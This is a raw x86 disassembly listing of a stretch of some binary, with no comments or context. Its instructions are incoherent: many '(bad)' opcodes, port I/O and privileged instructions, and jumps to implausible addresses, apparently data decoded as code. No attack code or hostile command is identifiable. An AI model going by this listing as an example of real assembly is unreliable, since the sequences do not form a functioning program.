  4225b0:	test   eax,0x7d9d0a60
  4225b5:	(bad)  
  4225b6:	fist   WORD PTR [eax+0x45]
  4225b9:	das    
  4225ba:	scas   al,BYTE PTR es:[edi]
  4225bb:	es into 
  4225bd:	and    al,0x47
  4225bf:	jmp    0xea66:0x973bd28d
  4225c6:	pop    ss
  4225c7:	int    0x2a
  4225c9:	test   BYTE PTR [eax-0xa1d6995],cl
  4225cf:	aaa    
  4225d0:	ja     0x422632
  4225d2:	sub    al,0xe5
  4225d4:	shl    dh,1
  4225d6:	loope  0x42261c
  4225d8:	out    dx,al
  4225d9:	cli    
  4225da:	push   esi
  4225db:	shr    BYTE PTR ds:0xd1a84578,cl
  4225e1:	ret    0xd16c
  4225e4:	dec    esp
  4225e5:	int    0x15
  4225e7:	sbb    edx,DWORD PTR [edx-0x4f]
  4225ea:	xchg   edx,eax
  4225eb:	cld    
  4225ec:	cdq    
  4225ed:	mov    cs,WORD PTR [edi]
  4225ef:	sub    DWORD PTR [ecx+edx*2+0x78],ebx
  4225f3:	or     DWORD PTR [eax],esi
  4225f5:	fidivr WORD PTR [ebx+0x77]
  4225f8:	fwait
  4225f9:	cld    
  4225fa:	xor    al,0x5a
  4225fc:	pop    edi
  4225fd:	icebp  
  4225fe:	add    DWORD PTR [eax-0x4a],eax
  422601:	js     0x4225fe
  422603:	xchg   ebx,eax
  422604:	sahf   
  422605:	cs icebp 
  422607:	sub    bl,BYTE PTR [edx]
  422609:	fidivr WORD PTR [ebx]
  42260b:	cmp    BYTE PTR [edx+0x39619739],0x55
  422612:	inc    ebp
  422613:	xor    al,0x0
  422615:	mov    esp,0xd2f33568
  42261a:	push   0x97ad3174
  42261f:	fidivr DWORD PTR [ecx+eax*4]
  422622:	hlt    
  422623:	ins    BYTE PTR es:[edi],dx
  422624:	dec    edx
  422625:	loope  0x422636
  422627:	pop    ebx
  422628:	mov    bl,0x47
  42262a:	pop    ds
  42262b:	std    
  42262c:	pop    edi
  42262d:	dec    esi
  42262e:	dec    esi
  42262f:	(bad)  
  422630:	lock add DWORD PTR [edx],0x7545adf3
  422637:	lea    ebx,[edi-0xa]
  42263a:	push   ecx
  42263b:	imul   ebp,esi,0x38ba6c11
  422641:	call   0x2e46efdb
  422646:	sar    ebx,0xca
  422649:	in     al,0x63
  42264b:	repnz push 0x3ace7ad1
  422651:	data16 mov WORD PTR [edx+esi*2-0x7b11c236],fs
  422659:	mov    esi,DWORD PTR [ebp+ebx*8-0x9b2e53]
  422660:	push   es
  422661:	push   ebx
  422662:	retf   0x7c65
  422665:	or     eax,DWORD PTR [esi]
  422667:	xchg   BYTE PTR [edx+0x4884c6db],cl
  42266d:	add    bl,ch
  42266f:	lods   al,BYTE PTR ds:[esi]
  422670:	cmp    eax,0xd9b02bca
  422675:	adc    ah,BYTE PTR [esi-0x7d]
  422678:	rcl    BYTE PTR [eax],1
  42267a:	in     eax,0x41
  42267c:	out    dx,al
  42267d:	xchg   DWORD PTR [edi-0xd],edx
  422680:	xor    al,0xb1
  422682:	fdecstp 
  422684:	arpl   bp,bx
  422686:	mov    ds:0x33840d20,al
  42268b:	sahf   
  42268c:	dec    DWORD PTR [ebx]
  42268e:	sahf   
  42268f:	test   al,0x33
  422692:	mov    al,ds:0xfdf822bc
  422697:	and    al,0x0
  422699:	jbe    0x422685
  42269b:	add    BYTE PTR [esi],0xb3
  42269e:	stos   BYTE PTR es:[edi],al
  42269f:	cwde   
  4226a0:	add    BYTE PTR [ebx],al
  4226a2:	xor    al,0x5
  4226a4:	in     al,dx
  4226a5:	cdq    
  4226a6:	shr    DWORD PTR [esi],1
  4226a8:	test   eax,0x643a731b
  4226ad:	daa    
  4226ae:	inc    esi
  4226af:	jge    0x4226b0
  4226b1:	adc    bl,bh
  4226b3:	mov    esp,0xa28df449
  4226b8:	mov    eax,0xe9480f42
  4226bd:	xchg   edx,eax
  4226be:	jp     0x4226ea
  4226c0:	mov    esi,0xf65ea9dd
  4226c5:	sbb    al,0x63
  4226c7:	scas   eax,DWORD PTR es:[edi]
  4226c8:	sbb    edi,DWORD PTR [ebp-0x68]
  4226cb:	dec    esi
  4226cc:	fnsave [edi]
  4226ce:	sbb    DWORD PTR [eax-0x118ecb51],0xffffff93
  4226d5:	mov    cs,WORD PTR [ebx-0x68]
  4226d8:	dec    ebx
  4226d9:	in     al,dx
  4226da:	int    0x28
  4226dc:	(bad)
  4226df:	pop    edi
  4226e0:	out    0xd9,al
  4226e2:	cld    
  4226e3:	fisub  WORD PTR ds:0x1dcd0da5
  4226e9:	add    DWORD PTR [esp+ebp*2+0x1ed1aead],edx
  4226f0:	fbstp  TBYTE PTR [ebx+0x39]
  4226f3:	xor    BYTE PTR [ebx+0xc],cl
  4226f6:	fst    DWORD PTR [edi]
  4226f8:	and    eax,0x42c27ba2
  4226fd:	dec    eax
  4226fe:	mov    ?,WORD PTR [esi+0x1d]
  422701:	dec    ebp
  422702:	sbb    eax,0x5776a046
  422707:	cmc    
  422708:	ret    
  422709:	sbb    BYTE PTR [eax-0x30],0x48
  42270d:	imul   ebx,DWORD PTR [eax-0x66],0xffffffa6
  422711:	js     0x42278c
  422713:	jmp    0x5b89ac7e
  422718:	cmp    ebx,DWORD PTR [edi]
  42271a:	lahf   
  42271b:	loop   0x42270f
  42271d:	and    BYTE PTR [ecx],0x2e
  422720:	(bad)
  422723:	jae    0x422795
  422725:	das    
  422726:	fstp   QWORD PTR ds:0xde2e0a90
  42272c:	jo     0x422706
  42272e:	and    edi,edi
  422730:	sbb    cl,BYTE PTR [ecx+eax*4+0x25]
  422734:	mov    cl,0x93
  422736:	gs out dx,eax
  422738:	rcr    DWORD PTR [edi],1
  42273a:	fist   DWORD PTR [edx-0x5ac9c4d4]
  422740:	outs   dx,DWORD PTR ds:[esi]
  422741:	mov    eax,ds:0x2265e191
  422746:	(bad)  
  422747:	cld    
  422748:	adc    DWORD PTR [eiz*2-0x565cc94f],ebp
  42274f:	pop    ds
  422750:	xchg   BYTE PTR [ebx+0x5],bl
  422753:	sar    al,0x4e
  422756:	lds    esi,FWORD PTR [ecx+0x401630a5]
  42275c:	cs pop edx
  42275e:	fcomp  DWORD PTR [edi+ebx*1-0x7eab9593]
  422765:	xor    DWORD PTR [edx-0x78e9bc5a],edi
  42276b:	inc    ecx
  42276c:	dec    esi
  42276d:	pop    esp
  42276e:	imul   ebx,DWORD PTR [edx-0x1d36e346],0x5258677f
  422778:	test   edi,edi
  42277a:	or     edx,DWORD PTR [ecx]
  42277c:	inc    ebp
  42277d:	mov    esi,0x429ecda9
  422782:	int3   
  422783:	xchg   esp,eax
  422784:	mov    edx,0x71e7366a
  422789:	xlat   BYTE PTR ds:[ebx]
  42278a:	jbe    0x42271a
  42278c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42278d:	jmp    0xabbedd2c
  422792:	in     ax,0x24
  422795:	mov    dl,0x9c
  422797:	lahf   
  422798:	pop    esp
  422799:	inc    esp
  42279a:	enter  0xd1c0,0xa1
  42279e:	stos   DWORD PTR es:[edi],eax
  42279f:	xor    al,0xdd
  4227a1:	xchg   dl,bh
  4227a3:	popa   
  4227a4:	lock inc ebx
  4227a6:	cli    
  4227a7:	in     eax,0x4e
  4227a9:	cdq    
  4227aa:	mov    ebx,0x19fe8d7e
  4227af:	push   ecx
  4227b0:	shl    BYTE PTR [edx-0x15],cl
  4227b3:	frstor [esi-0x4a438267]
  4227b9:	add    BYTE PTR [edi+eiz*2-0x36c78094],0xb7
  4227c1:	in     al,0x71
  4227c3:	push   es
  4227c4:	jbe    0x4227a1
  4227c6:	add    BYTE PTR [ecx-0x3a],dl
  4227c9:	in     al,0xe8
  4227cb:	mov    dh,BYTE PTR [edx-0xd54bb2f]
  4227d1:	in     al,dx
  4227d2:	and    eax,0xd9f56222
  4227d7:	add    DWORD PTR [eax-0x2cadb142],edi
  4227dd:	stc    
  4227de:	jae    0x4227a0
  4227e0:	pop    ecx
  4227e1:	mov    WORD PTR [esi],ds
  4227e3:	ins    DWORD PTR es:[edi],dx
  4227e4:	xchg   esi,eax
  4227e5:	xchg   esp,eax
  4227e6:	ins    DWORD PTR es:[edi],dx
  4227e7:	xchg   esp,eax
  4227e8:	xor    eax,DWORD PTR [edi-0x79]
  4227eb:	mov    BYTE PTR [ecx],dl
  4227ed:	test   BYTE PTR [ebp+0x6b],ch
  4227f0:	mov    esp,ss
  4227f2:	xchg   edi,eax
  4227f3:	push   DWORD PTR [ebx+0x78e2389e]
  4227f9:	push   ecx
  4227fa:	pusha  
  4227fb:	sar    DWORD PTR [eax+0x61bc3847],1
  422801:	push   0xffffffc8
  422803:	cli    
  422804:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422805:	dec    ebx
  422806:	in     al,dx
  422807:	int    0x73
  422809:	out    dx,al
  42280a:	in     al,dx
  42280b:	out    dx,eax
  42280c:	jne    0x4227ef
  42280e:	clc    
  42280f:	repnz mov esi,0x9b40f003
  422815:	or     DWORD PTR [edx-0x4a],esp
  422818:	loope  0x422896
  42281a:	outs   dx,DWORD PTR ds:[esi]
  42281b:	inc    eax
  42281c:	imul   ebx,DWORD PTR [ecx+0x165c2299],0x2e
  422823:	hlt    
  422824:	fnstsw WORD PTR [edi+0x6e]
  422827:	pop    ecx
  422828:	adc    BYTE PTR [ecx+0x5d],dh
  42282b:	sbb    al,0xad
  42282d:	pop    edx
  42282e:	jl     0x42286b
  422830:	retf   
  422831:	adc    DWORD PTR [ebx-0x50],esi
  422834:	int    0xe6
  422836:	xor    DWORD PTR [ecx],ebp
  422838:	jo     0x422881
  42283a:	mov    ebp,DWORD PTR [edi+0x375e15ea]
  422840:	jo     0x4227d4
  422842:	ins    BYTE PTR es:[edi],dx
  422843:	cmp    al,0xdc
  422845:	lahf   
  422846:	cmp    eax,0x7a6a74ca
  42284b:	in     al,dx
  42284c:	dec    esi
  42284d:	je     0x422803
  42284f:	cwde   
  422850:	or     edx,DWORD PTR [edi]
  422852:	pop    ecx
  422853:	fs sub al,0x5b
  422856:	inc    esi
  422857:	mov    edx,0x621afc6c
  42285c:	inc    ecx
  42285d:	xor    al,0xc3
  42285f:	lock or esp,DWORD PTR [esi-0x8]
  422863:	call   0xcc175cd5
  422868:	xchg   ecx,eax
  422869:	popa   
  42286a:	mov    bl,0xb4
  42286c:	cmc    
  42286d:	in     al,0x9e
  42286f:	push   es
  422870:	mov    al,0xa8
  422872:	sub    esp,ebx
  422874:	inc    eax
  422875:	sub    al,0x3f
  422877:	mov    edi,0xc377a790
  42287c:	pop    eax
  42287d:	mov    dl,0xee
  42287f:	scas   al,BYTE PTR es:[edi]
  422880:	add    ecx,DWORD PTR [edi-0x6798041b]
  422886:	aam    0xf7
  422888:	inc    edx
  422889:	sbb    DWORD PTR [ecx+0x44],esp
  42288c:	jle    0x42285e
  42288e:	adc    al,0x37
  422890:	fcom   QWORD PTR [ecx]
  422892:	mov    ebp,DWORD PTR [esi*8+0x448a8dad]
  422899:	push   0x1a
  42289b:	xor    dl,BYTE PTR [esi]
  42289d:	or     eax,0xf24785b3
  4228a2:	cli    
  4228a3:	lahf   
  4228a4:	call   0xacf4a490
  4228a9:	mov    WORD PTR [edi+edx*1-0x14],?
  4228ad:	out    0x5,eax
  4228af:	and    DWORD PTR ds:0x17ae159c,ebx
  4228b5:	jg     0x422860
  4228b7:	call   0x548c:0xfa0b466c
  4228be:	inc    esp
  4228bf:	into   
  4228c0:	aam    0xed
  4228c2:	and    BYTE PTR [esi-0x73db93f6],0xaf
  4228c9:	sub    DWORD PTR [ecx-0x2a],0x4a
  4228cd:	or     ch,BYTE PTR [ebx-0x43]
  4228d0:	fcomp  DWORD PTR [edx]
  4228d2:	pusha  
  4228d3:	dec    esp
  4228d4:	dec    edx
  4228d5:	mov    al,0x1d
  4228d7:	cmp    al,0x65
  4228d9:	daa    
  4228da:	push   esp
  4228db:	cmp    al,0x3c
  4228dd:	pop    ds
  4228de:	not    BYTE PTR [esp+eax*2-0x14]
  4228e2:	mov    ?,WORD PTR [esi+0x234d10ff]
  4228e8:	mov    esp,0xfc66010c
  4228ed:	(bad)  
  4228ee:	mov    bl,0x26
  4228f0:	(bad)  
  4228f2:	sbb    esi,DWORD PTR [eax]
  4228f4:	mov    esi,0x818808a
  4228f9:	repz inc ebx
  4228fb:	repnz in eax,dx
  4228fd:	js     0x4228bf
  4228ff:	sbb    BYTE PTR [eax-0x17a65861],ah
  422905:	mov    eax,ds:0x9431fde7
  42290a:	push   ebx
  42290b:	test   al,0xfb
  42290d:	call   0x1dea5a85
  422912:	test   eax,0x77c6e8c6
  422917:	cmp    eax,DWORD PTR [eax+0x35ff76da]
  42291d:	mov    ebx,0xfc2d7b00
  422922:	push   eax
  422923:	push   ds
  422924:	jb     0x422999
  422926:	cmp    eax,0x75f76653
  42292b:	div    dl
  42292d:	cmp    al,0x5d
  42292f:	adc    al,0x71
  422931:	scas   al,BYTE PTR es:[edi]
  422932:	push   ds
  422933:	push   ss
  422934:	xor    bl,BYTE PTR [esp+ecx*2]
  422937:	adc    esp,edx
  422939:	jecxz  0x42291b
  42293b:	fnsave [edi]
  42293d:	xchg   ecx,eax
  42293e:	dec    edi
  42293f:	push   esp
  422940:	push   edi
  422941:	cmp    BYTE PTR [ebp+0x11],0x5d
  422945:	mov    ah,0xc9
  422947:	and    eax,0x8846a8fc
  42294c:	out    0x7e,eax
  42294e:	call   DWORD PTR [esi+0x48]
  422951:	aad    0xad
  422953:	xor    eax,0x7995632
  422958:	dec    ebp
  422959:	test   eax,0xa6e4984b
  42295e:	inc    ebp
  42295f:	mov    dh,0xe1
  422961:	test   DWORD PTR [edi],esi
  422963:	dec    edx
  422964:	or     bl,BYTE PTR [edi-0x7686bb2e]
  42296a:	test   DWORD PTR [edx+ebx*4],esp
  42296d:	loope  0x42298e
  42296f:	les    esp,FWORD PTR [ebx+0x7]
  422972:	mov    ch,0x55
  422974:	fldz   
  422976:	inc    esi
  422977:	xchg   ebp,eax
  422978:	fwait
  422979:	mov    bh,0x4e
  42297b:	or     dh,BYTE PTR [ebp-0x9dde5bb]
  422981:	xchg   edi,eax
  422982:	out    0x63,eax
  422984:	cmc    
  422985:	scas   eax,DWORD PTR es:[edi]
  422986:	jns    0x4229d5
  422988:	push   ebx
  422989:	(bad)  
  42298a:	sbb    BYTE PTR [ebp-0x5a2e79e7],dl
  422990:	scas   eax,DWORD PTR es:[edi]
  422991:	sbb    BYTE PTR [eax+0x18],bl
  422994:	sbb    ecx,DWORD PTR [ebp+0x5]
  422997:	add    esp,DWORD PTR [edx]
  422999:	push   ecx
  42299a:	(bad)  
  42299c:	cdq    
  42299d:	xor    BYTE PTR [ebx],dh
  42299f:	add    BYTE PTR [ecx+0x36],0x3d
  4229a3:	shl    BYTE PTR [edx],0xa9
  4229a6:	test   DWORD PTR [edx],esp
  4229a8:	popf   
  4229a9:	and    al,0x4a
  4229ab:	xor    eax,0xef588034
  4229b0:	jl     0x4229b7
  4229b2:	pop    ebx
  4229b3:	pop    edi
  4229b4:	loopne 0x422a24
  4229b6:	sbb    eax,0x4619d5ce
  4229bb:	sbb    DWORD PTR [edi-0x5d9cdd4b],esp
  4229c1:	add    eax,0x787143a3
  4229c6:	test   eax,0x1288b747
  4229cb:	and    bl,BYTE PTR [ebp-0x52b4f8e8]
  4229d1:	sti    
  4229d2:	sbb    eax,0xd00bd117
  4229d7:	imul   edi,DWORD PTR [eax+0x6a],0xffffffdb
  4229db:	mov    dh,0xd1
  4229dd:	stos   DWORD PTR es:[edi],eax
  4229de:	gs and ebx,ebp
  4229e1:	inc    edx
  4229e2:	mov    dh,0x1e
  4229e4:	or     al,0xe4
  4229e6:	mov    esp,DWORD PTR [edi+eax*1-0xd]
  4229ea:	hlt    
  4229eb:	xor    cl,BYTE PTR [ebp+0x30d100bf]
  4229f1:	xchg   BYTE PTR [eax-0x80],bh
  4229f4:	enter  0xefd9,0xbc
  4229f8:	lea    ecx,[edi+0x1aa07c6b]
  4229fe:	fiadd  WORD PTR [ebp+0x2b7250f]
  422a04:	push   eax
  422a05:	mov    ebx,0xdb576882
  422a0a:	sub    eax,DWORD PTR [esi]
  422a0c:	sbb    DWORD PTR [ecx],ecx
  422a0e:	push   ebx
  422a0f:	je     0x4229f5
  422a11:	push   es
  422a12:	mov    BYTE PTR [eax+0xd906034],bh
  422a18:	addr16 daa 
  422a1a:	xor    BYTE PTR [ebp+0x5c358293],0x5d
  422a21:	shl    BYTE PTR [ecx],0xf1
  422a24:	(bad)  
  422a25:	imul   ecx,DWORD PTR [ebp+0x46c6d99b],0x5d
  422a2c:	mov    esi,0x943e48a
  422a31:	aas    
  422a32:	repnz xlat BYTE PTR ds:[ebx]
  422a34:	lahf   
  422a35:	aam    0xb6
  422a37:	dec    ebp
  422a38:	xor    cl,BYTE PTR [eax+0x724d1557]
  422a3e:	mov    cl,0x9a
  422a40:	pop    ecx
  422a41:	xor    esi,edx
  422a43:	fbstp  TBYTE PTR [edx+eiz*8]
  422a46:	sub    DWORD PTR [ebx-0x4f],ebx
  422a49:	jb     0x422a2f
  422a4b:	repz sti 
  422a4d:	shl    ebp,cl
  422a4f:	xlat   BYTE PTR ds:[ebx]
  422a50:	push   cs
  422a51:	mov    bl,0x21
  422a53:	and    al,0x69
  422a55:	adc    eax,0x3a8199c2
  422a5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a5b:	adc    eax,0x7e27756c
  422a60:	ror    ch,0x46
  422a63:	out    0x93,eax
  422a65:	cmp    DWORD PTR [edx+0x54],eax
  422a68:	aaa    
  422a69:	dec    ebx
  422a6a:	repnz call 0xc33:0x1bceeab7
  422a72:	inc    ecx
  422a73:	xor    eax,0x3f156972
  422a78:	stc    
  422a79:	imul   DWORD PTR [ebx-0xd]
  422a7c:	pop    edi
  422a7d:	jbe    0x422a46
  422a7f:	in     al,dx
  422a80:	frstor [edi+0x52]
  422a83:	cld    
  422a84:	push   edx
  422a85:	rol    BYTE PTR [esp+esi*4],0xd4
  422a89:	loope  0x422a60
  422a8b:	int3   
  422a8c:	loope  0x422acd
  422a8e:	fwait
  422a8f:	and    cl,ch
  422a91:	inc    eax
  422a92:	lea    ebp,[ecx-0x3cb07afb]
  422a98:	repnz daa 
  422a9a:	push   edx
  422a9b:	jno    0x422a7f
  422a9d:	mov    edx,0xb176b4fd
  422aa2:	test   DWORD PTR [ecx+0x7af19c69],eax
  422aa8:	jmp    0x422a5c
  422aaa:	mov    bh,0x5e
  422aac:	test   BYTE PTR [ebp+eiz*1+0x5e7f0096],bh
  422ab3:	sbb    al,0x1c
  422ab5:	add    eax,0xd2181f53
  422aba:	iret   
  422abb:	dec    edi
  422abc:	out    0xef,eax
  422abe:	xchg   ebp,eax
  422abf:	daa    
  422ac0:	out    0x3a,al
  422ac2:	in     al,0xd9
  422ac4:	mov    WORD PTR [ecx+0x21],ss
  422ac7:	xchg   edx,eax
  422ac8:	sub    ebx,0xdf8f1753
  422ace:	inc    esi
  422acf:	jmp    0xcecf:0x668103fe
  422ad6:	out    dx,eax
  422ad7:	sbb    ah,ch
  422ad9:	inc    ecx
  422ada:	adc    DWORD PTR [eax+0x1b066d5d],ebx
  422ae0:	add    DWORD PTR [ecx+0xc],ebp
  422ae3:	(bad)  
  422ae4:	lds    esi,FWORD PTR ds:0xf474d8c6
  422aea:	lds    ebp,FWORD PTR [ecx+ecx*1+0x4c99d3e8]
  422af1:	mov    ch,0x14
  422af3:	pop    ss
  422af4:	pop    es
  422af5:	scas   eax,DWORD PTR es:[edi]
  422af6:	pusha  
  422af7:	mov    ecx,0x4358d7a3
  422afc:	push   ecx
  422afd:	inc    eax
  422afe:	rcl    DWORD PTR [edx-0x68],1
  422b01:	mov    DWORD PTR [esi+0x1f],esi
  422b04:	mov    ebx,0x7e189f0b
  422b09:	inc    edx
  422b0a:	and    BYTE PTR [edx-0x28729de6],dh
  422b10:	inc    edx
  422b11:	cmp    BYTE PTR [eax-0x58],ah
  422b14:	das    
  422b15:	mov    ebx,DWORD PTR [ecx]
  422b17:	inc    ebx
  422b18:	xor    BYTE PTR [ebx+0x7],ah
  422b1b:	rcr    BYTE PTR [edi-0x6],0x7
  422b1f:	push   cs
  422b20:	and    DWORD PTR [eax],ecx
  422b22:	outs   dx,DWORD PTR ds:[esi]
  422b23:	outs   dx,BYTE PTR ds:[esi]
  422b24:	lds    eax,FWORD PTR [ecx+0x19]
  422b27:	div    dl
  422b29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b2a:	cmp    BYTE PTR [esi+0x58],dl
  422b2d:	or     BYTE PTR [edx-0x10782b21],0x77
  422b34:	lds    edx,FWORD PTR [edi-0x7d]
  422b37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b38:	je     0x422b74
  422b3a:	ret    
  422b3b:	or     eax,0xdb03cb77
  422b40:	fist   WORD PTR [ebx-0x2cbd18c5]
  422b46:	lds    esi,FWORD PTR [ecx-0x46]
  422b49:	outs   dx,DWORD PTR ds:[esi]
  422b4a:	dec    ah
  422b4c:	int3   
  422b4d:	mov    ch,0x12
  422b4f:	xor    al,0xc2
  422b51:	js     0x422ad4
  422b53:	ins    BYTE PTR es:[edi],dx
  422b54:	out    dx,eax
  422b55:	adc    BYTE PTR [edi-0x4a5d4893],bl
  422b5b:	pushf  
  422b5c:	ss sti 
  422b5e:	mov    eax,?
  422b60:	test   DWORD PTR [ebx-0x609a6642],0xa5fd88d8
  422b6a:	ins    BYTE PTR es:[edi],dx
  422b6b:	xchg   edi,eax
  422b6c:	psubd  mm3,QWORD PTR [edi]
  422b6f:	dec    esi
  422b70:	push   esp
  422b71:	or     edx,DWORD PTR [esi]
  422b73:	fnstcw WORD PTR [ebp+0x25]
  422b76:	jl     0x422bc6
  422b78:	push   es
  422b79:	rcr    DWORD PTR [ecx-0x3cedd478],cl
  422b7f:	mov    edx,0x95288a98
  422b84:	cwde   
  422b85:	jp     0x422c00
  422b87:	pusha  
  422b88:	das    
  422b89:	repnz mov BYTE PTR ds:0x512cab75,al
  422b90:	inc    edi
  422b91:	ja     0x422b67
  422b93:	mov    edi,0x21c162ef
  422b98:	jb     0x422b29
  422b9a:	je     0x422b7b
  422b9c:	int3   
  422b9d:	test   al,0x1
  422b9f:	push   ebp
  422ba0:	pop    ds
  422ba1:	inc    ebx
  422ba2:	mov    esi,0xb9e3de39
  422ba7:	dec    ebp
  422ba8:	aad    0xd0
  422baa:	xchg   ebp,eax
  422bab:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  422bad:	pop    edi
  422bae:	icebp  
  422baf:	xchg   ecx,eax
  422bb0:	fldenvw [ebp+0x535f032d]
  422bb7:	or     bl,dl
  422bb9:	in     eax,dx
  422bba:	adc    al,0xeb
  422bbc:	mov    DWORD PTR [edx+0x6381893],ecx
  422bc2:	or     al,0xd8
  422bc4:	js     0x422b77
  422bc6:	cwde   
  422bc7:	inc    ecx
  422bc8:	imul   edx,DWORD PTR [edx+0x69],0x41
  422bcc:	inc    ebx
  422bcd:	xchg   ecx,eax
  422bce:	retf   
  422bcf:	(bad)  
  422bd0:	pop    edx
  422bd1:	add    eax,0xa149679f
  422bd6:	ss imul DWORD PTR ds:[edi+0x4567c921]
  422bde:	fldenv [ecx]
  422be0:	adc    BYTE PTR [ecx-0x44],0x18
  422be4:	or     DWORD PTR [ecx],ecx
  422be6:	xchg   esi,eax
  422be7:	push   edx
  422be8:	mov    dh,0xc8
  422bea:	inc    eax
  422beb:	cmp    DWORD PTR [edi+0x68cbaacf],ebx
  422bf1:	xchg   ecx,eax
  422bf2:	add    ebp,DWORD PTR [ebx]
  422bf4:	std    
  422bf5:	dec    ebp
  422bf6:	addr16 cdq 
  422bf8:	loopne 0x422c0d
  422bfa:	leave  
  422bfb:	xchg   ebp,eax
  422bfc:	and    BYTE PTR [esi],bh
  422bfe:	xor    edx,esi
  422c00:	pop    eax
  422c01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c02:	mov    bh,0x8a
  422c04:	mov    edi,0x10101eef
  422c09:	or     al,al
  422c0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c0c:	push   esp
  422c0d:	sar    DWORD PTR [edi-0x4f],1
  422c10:	fsubrp st(2),st
  422c12:	loop   0x422bc7
  422c14:	add    ebx,DWORD PTR [ebp+edx*2+0x56]
  422c18:	mov    eax,ds:0x7ef165ad
  422c1d:	imul   edi,DWORD PTR [edi],0xc9a305b4
  422c23:	sbb    al,0x63
  422c25:	gs xchg edi,eax
  422c27:	sar    BYTE PTR [edi+0x15],cl
  422c2a:	dec    eax
  422c2b:	stc    
  422c2c:	retf   
  422c2d:	fwait
  422c2e:	sbb    eax,DWORD PTR [esi+0x47]
  422c31:	pushf  
  422c32:	add    esp,DWORD PTR [ecx-0x5f]
  422c35:	fist   DWORD PTR [ecx+0x3d]
  422c38:	sub    BYTE PTR [edi],bl
  422c3a:	(bad)  
  422c3b:	jl     0x422ca1
  422c3d:	xlat   BYTE PTR ds:[ebx]
  422c3e:	push   edx
  422c3f:	bound  esp,QWORD PTR ds:0x7fab6701
  422c45:	lock mov ds:0xc3f8a8d9,eax
  422c4b:	or     esi,ebx
  422c4d:	jo     0x422c52
  422c4f:	pop    eax
  422c50:	(bad)  
  422c52:	call   0xfee9d9eb
  422c57:	push   ebx
  422c58:	icebp  
  422c59:	loope  0x422c21
  422c5b:	jnp    0x422cd0
  422c5d:	retf   
  422c5e:	inc    esp
  422c5f:	test   eax,0x1d14e58d
  422c64:	out    dx,eax
  422c65:	pop    esp
  422c66:	repnz das 
  422c68:	push   edi
  422c69:	mov    ebp,0x711f92a1
  422c6e:	(bad)
  422c71:	ja     0x422c6d
  422c73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c74:	pusha  
  422c75:	aad    0xa6
  422c77:	xchg   dl,bh
  422c79:	imul   ebx,ebp,0xffffffe4
  422c7c:	fidiv  DWORD PTR [ecx+edi*2]
  422c7f:	adc    dl,ah
  422c81:	arpl   WORD PTR ds:0xb51dc6ce,ax
  422c88:	div    BYTE PTR [eax-0x6914dcef]
  422c8e:	repnz (bad) 
  422c90:	loope  0x422cbf
  422c92:	mov    dh,0x9
  422c94:	jecxz  0x422c22
  422c96:	rcr    DWORD PTR [esi],1
  422c98:	push   edx
  422c99:	inc    edi
  422c9a:	mov    ds:0x208b6b8b,al
  422c9f:	fist   WORD PTR [edi]
  422ca1:	ins    DWORD PTR es:[edi],dx
  422ca2:	xchg   ebx,eax
  422ca3:	push   0x36
  422ca5:	ficom  DWORD PTR [eax-0x775254ad]
  422cab:	xchg   edx,eax
  422cac:	mov    esp,0x2d60570a
  422cb1:	in     al,0x4c
  422cb3:	mov    al,0xf4
  422cb5:	xor    BYTE PTR [esi],cl
  422cb7:	dec    esp
  422cb8:	outs   dx,BYTE PTR gs:[esi]
  422cba:	cld    
  422cbb:	mov    al,0x94
  422cbd:	sub    al,0x7f
  422cbf:	sbb    al,0xea
  422cc1:	mov    bh,0x67
  422cc3:	inc    esi
  422cc4:	xor    al,0xcd
  422cc6:	test   DWORD PTR [esi+0x79696091],edx
  422ccc:	cdq    
  422ccd:	and    esi,DWORD PTR [esi-0x3b100719]
  422cd3:	out    dx,eax
  422cd4:	stc    
  422cd5:	loopne 0x422cdf
  422cd7:	test   al,0x21
  422cd9:	or     BYTE PTR [esi+0x7e03e19d],0x32
  422ce0:	or     eax,0x53bd209e
  422ce5:	loop   0x422d47
  422ce7:	mov    al,0x82
  422ce9:	mov    ebx,0xcf914300
  422cee:	add    al,0x44
  422cf0:	lea    edx,[ebp+0x5bc1d45c]
  422cf6:	test   ebx,ebp
  422cf8:	push   esp
  422cf9:	ins    BYTE PTR es:[edi],dx
  422cfa:	fiadd  WORD PTR [esi-0x16]
  422cfd:	sub    DWORD PTR [edx-0x38ce40cd],0x7e
  422d04:	push   eax
  422d05:	adc    al,0x6f
  422d07:	test   BYTE PTR [eax],dh
  422d09:	add    dl,BYTE PTR [ecx+edx*1+0x31]
  422d0d:	mov    eax,ds:0x8175ac5
  422d12:	or     al,0xc4
  422d14:	or     DWORD PTR [ebp-0xd4f1a82],esi
  422d1a:	inc    ebx
  422d1b:	sbb    ecx,esp
  422d1d:	enter  0x903e,0x97
  422d21:	adc    esi,ebx
  422d23:	and    dl,BYTE PTR [esi-0x49e55fd5]
  422d29:	clc    
  422d2a:	mov    bl,cl
  422d2c:	stos   BYTE PTR es:[edi],al
  422d2d:	xchg   ebp,eax
  422d2e:	jge    0x422d40
  422d30:	jmp    0x422d44
  422d32:	adc    al,0x48
  422d34:	push   ds
  422d35:	lock imul DWORD PTR [eax+edx*4-0x1441b68e]
  422d3d:	(bad)
  422d40:	xchg   ebp,eax
  422d41:	pop    esi
  422d42:	or     BYTE PTR [ebx-0x75a497f6],bl
  422d48:	dec    ebp
  422d49:	into   
  422d4a:	daa    
  422d4b:	das    
  422d4c:	sbb    DWORD PTR [edx-0x28ffd54f],esp
  422d52:	adc    dl,BYTE PTR [ecx]
  422d54:	in     eax,0x8f
  422d56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d57:	xchg   ecx,eax
  422d58:	call   0x48f396fc
  422d5d:	gs push edi
  422d5f:	fadd   QWORD PTR [esi+0x42]
  422d62:	out    0x1a,eax
  422d64:	cmc    
  422d65:	and    BYTE PTR [edx],cl
  422d67:	mov    cl,0x86
  422d69:	add    esp,esp
  422d6b:	xchg   esi,eax
  422d6c:	scas   eax,DWORD PTR es:[edi]
  422d6d:	inc    esp
  422d6e:	jnp    0x422cfb
  422d70:	ret    
  422d71:	jg     0x422da5
  422d73:	push   cs
